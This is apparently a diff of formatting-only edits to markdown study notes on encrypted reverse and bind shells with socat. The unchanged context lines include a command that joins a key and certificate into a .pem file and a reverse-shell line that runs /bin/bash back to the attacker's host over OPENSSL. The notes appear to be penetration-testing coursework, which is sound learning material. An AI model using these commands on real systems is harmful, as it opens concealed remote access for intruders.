@@ -1,9 +1,5 @@
-
 Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.
-
-
 # Useful Commands:
-
 
 We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
 
@@ -18,7 +14,6 @@ We then need to merge the two created files into a single `.pem` file:
 ```bash
 cat shell.key shell.crt > shell.pem
 ```
-
 ### Encrypted Reverse Shell
 
 When we set up our reverse shell listener, we use:
@@ -34,7 +29,6 @@ To connect back, we would use:
 ```bash
 socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 ```
-
 ### Encrypted Bind Shell
 
 Target:
@@ -50,7 +44,6 @@ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 ```
 
 Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
-
 ### Critical Thinking: Stable Encrypted Shell
 
 ==We merged the encryption to stabilisation ==
